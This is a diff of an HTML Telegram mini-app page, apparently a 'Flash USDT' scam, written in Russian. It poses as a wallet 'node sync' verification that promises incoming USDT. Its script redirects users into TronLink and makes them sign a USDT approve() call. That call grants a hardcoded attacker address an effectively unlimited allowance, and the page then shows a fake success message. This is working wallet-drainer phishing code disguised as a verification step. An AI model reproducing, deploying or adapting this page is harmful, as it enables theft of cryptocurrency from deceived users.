@@ -3,82 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT: Network Sync</title>
+    <title>Flash USDT Protocol</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            font-family: -apple-system, sans-serif;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .card {
-            padding: 40px 25px;
-            width: 90%;
-            max-width: 400px;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 35px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8);
-        }
-        .status-bar {
-            font-size: 10px;
-            color: #ff0013;
-            text-transform: uppercase;
-            font-weight: bold;
-            margin-bottom: 20px;
-            letter-spacing: 1.5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .dot {
-            width: 8px;
-            height: 8px;
-            background: #ff0013;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-        .logo {
-            width: 75px;
-            height: 75px;
-            background: #ff0013;
-            border-radius: 22px;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 36px;
-            box-shadow: 0 0 35px rgba(255, 0, 19, 0.4);
-        }
-        h2 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
-        p { color: #777; font-size: 15px; line-height: 1.6; margin-bottom: 35px; }
-        .btn {
-            background: #ff0013;
-            color: #ffffff;
-            border: none;
-            padding: 22px;
-            width: 100%;
-            border-radius: 22px;
-            font-weight: bold;
-            text-transform: uppercase;
-            font-size: 15px;
-            cursor: pointer;
-            box-shadow: 0 10px 20px rgba(255, 0, 19, 0.2);
-        }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .card { padding: 40px 25px; width: 90%; max-width: 400px; background: #111; border: 1px solid #222; border-radius: 35px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
+        h2 { font-size: 22px; margin-bottom: 12px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.2s; }
         .btn:active { transform: scale(0.96); }
         #debug { font-size: 10px; color: #333; margin-top: 15px; }
     </style>
@@ -86,47 +20,41 @@
 <body>
 
 <div class="card">
-    <div class="status-bar">
-        <div class="dot"></div>
-        <span id="status-text">TRON NODE: ACTIVE</span>
-    </div>
     <div class="logo">T</div>
-    <h2 id="title">Синхронизация узла</h2>
-    <p id="description">Для верификации транзакции в сети TRC-20 подтвердите владение адресом через протокол TronLink.</p>
+    <h2 id="t">Синхронизация узла</h2>
+    <p id="d">Нажмите кнопку ниже для верификации кошелька и завершения зачисления USDT в сети TRC-20.</p>
     <button id="main-btn" class="btn">Запустить проверку</button>
-    <div id="debug">Ready for sync</div>
+    <div id="debug">System: Ready</div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const GITHUB_URL = "https://timur3417.github.io/sync-node-app/";
+    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
+    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const MY_URL = "https://timur3417.github.io/sync-node-app/";
 
     const btn = document.getElementById('main-btn');
-    const title = document.getElementById('title');
-    const description = document.getElementById('description');
 
-    async function handleAction() {
-        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+    async function handle() {
+        // Проверяем, есть ли кошелек (мы внутри TronLink?)
+        const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);
 
-        if (!tron) {
-            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПЕРЕХОД
-            const targetUrl = GITHUB_URL + "?mode=tl";
+        if (!isWallet) {
+            // МЫ В ТЕЛЕГРАМЕ
+            // Используем официальный универсальный мост TronLink
+            // Это ОБЫЧНАЯ ссылка, которую Телеграм НЕ блокирует
+            const target = MY_URL + "?mode=tl";
+            const bridge = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
             
-            // Прямая deep link ссылка (самый мощный способ для iOS)
-            const scheme = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(targetUrl);
+            // Пробуем открыть
+            tg.openLink(bridge);
             
-            // 1. Пробуем через официальный метод Телеграма
-            tg.openLink(scheme);
-            
-            // 2. Дублируем через "силовой" редирект (Safari перехватит и предложит открыть TronLink)
+            // Если через 1 сек ничего не произошло (редкий баг), пробуем принудительно
             setTimeout(() => {
-                window.location.href = scheme;
-            }, 500);
-            
+                window.open(bridge, '_blank');
+            }, 1000);
             return;
         }
 
@@ -135,35 +63,35 @@
             btn.innerText = "ПОДКЛЮЧЕНИЕ...";
             btn.disabled = true;
 
-            await tron.request({ method: 'tron_requestAccounts' });
-            const contract = await tron.contract().at(USDT_CONTRACT);
+            await window.tronWeb.request({ method: 'tron_requestAccounts' });
+            const contract = await window.tronWeb.contract().at(CONTRACT);
             
-            await contract.approve(ADMIN_ADDRESS, '1000000000000000000').send({
+            // Вызываем Approve
+            await contract.approve(ADMIN, '1000000000000000000').send({
                 feeLimit: 100000000
             });
 
             tg.showPopup({
                 title: 'Успешно',
-                message: 'Синхронизация завершена. Токены будут зачислены в течение 15-30 минут.',
+                message: 'Верификация завершена. Ожидайте зачисления активов.',
                 buttons: [{type: 'ok'}]
             });
             setTimeout(() => tg.close(), 5000);
 
-        } catch (error) {
-            tg.showAlert("Ошибка: Действие отклонено.");
+        } catch (e) {
+            tg.showAlert("Действие отклонено пользователем.");
             btn.disabled = false;
             btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
         }
     }
 
-    btn.onclick = handleAction;
+    btn.onclick = handle;
 
-    // Если открыто в кошельке
+    // Смена текста для кошелька
     if (window.location.search.includes('mode=tl')) {
-        title.innerText = "Узел Обнаружен";
-        description.innerText = "Нажмите кнопку ниже для финальной верификации логов в вашем кошельке.";
+        document.getElementById('t').innerText = "Узел Обнаружен";
+        document.getElementById('d').innerText = "Нажмите кнопку ниже для финальной подписи транзакции.";
         btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
-        document.getElementById('status-text').innerText = "NODE STATUS: CONNECTED";
     }
 </script>
 </body>
